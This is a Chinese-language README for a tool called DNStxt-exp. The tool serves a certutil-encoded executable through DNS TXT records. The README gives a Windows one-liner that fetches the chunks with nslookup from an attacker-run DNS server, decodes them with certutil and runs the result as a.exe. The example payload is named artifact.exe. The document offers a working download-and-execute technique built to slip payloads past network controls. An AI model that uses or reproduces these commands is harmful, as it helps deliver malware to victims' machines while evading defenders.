# DNStxt-exp
一个提供查询 TXT 记录的 DNS 服务利用工具。例如：可配合 Windows 下的 certutil 工具传输小文件（64KB）

## HELP信息
```text
_____________   _____________       _____                            
___  __ \__  | / /_  ___/_  /____  ___  /_      _________  _________ 
__  / / /_   |/ /_____ \_  __/_  |/_/  __/_______  _ \_  |/_/__  __ \
_  /_/ /_  /|  / ____/ // /_ __>  < / /_ _/_____/  __/_>  < __  /_/ /
/_____/ /_/ |_/  /____/ \__/ /_/|_| \__/        \___//_/|_| _  .___/ 
                                                            /_/

DNStxt-exp Version: 0.0.1 -- Created by vaycore

Options:
  -f string
        Generate encode.txt file command: ==> certutil.exe -encode artifact.exe encode.txt <==
         (default "encode.txt")
  -flag string
        Add prefix flag to lines (default "exec")
  -name string
        DNS server name (default "public1.alidns.com")
  -p int
        DNS server port (default 53)
```

## 使用方式
利用 Windows 自带的 `certutil.exe` 工具，先在生成一个 `encode.txt` 文件，命令如下：

```shell
certutil.exe -encode <要传输的文件> encode.txt

#例如：
certutil.exe -encode artifact.exe encode.txt
```

将文件放到与 `DNStxt-exp` 程序同级，然后执行，执行结果如下

```text
$ ls
dnstxt-exp   encode.txt

$ ./dnstxt-exp
_____________   _____________       _____                            
___  __ \__  | / /_  ___/_  /____  ___  /_      _________  _________ 
__  / / /_   |/ /_____ \_  __/_  |/_/  __/_______  _ \_  |/_/__  __ \
_  /_/ /_  /|  / ____/ // /_ __>  < / /_ _/_____/  __/_>  < __  /_/ /
/_____/ /_/ |_/  /____/ \__/ /_/|_| \__/        \___//_/|_| _  .___/ 
                                                            /_/

DNStxt-exp Version: 0.0.1 -- Created by vaycore

Revert file and run:
cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www.baidu.com 0.0.0.0 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" > d.txt && certutil -decode d.txt a.exe && cmd /c a.exe

Start Listing ... 0.0.0.0:53, ServerName: public1.alidns.com
```

Windows 平台下使用 `nslookup` 工具查询和还原成文件命令（需要将下面的 `0.0.0.0` 配置 DNS 服务器的IP地址，`a.exe` 是目标文件）：

```shell
cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www.baidu.com 0.0.0.0 ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" > d.txt && certutil -decode d.txt a.exe
```

## 参考文章

https://mp.weixin.qq.com/s/pxKmEO3_ljWSW7WhNQbSzQ
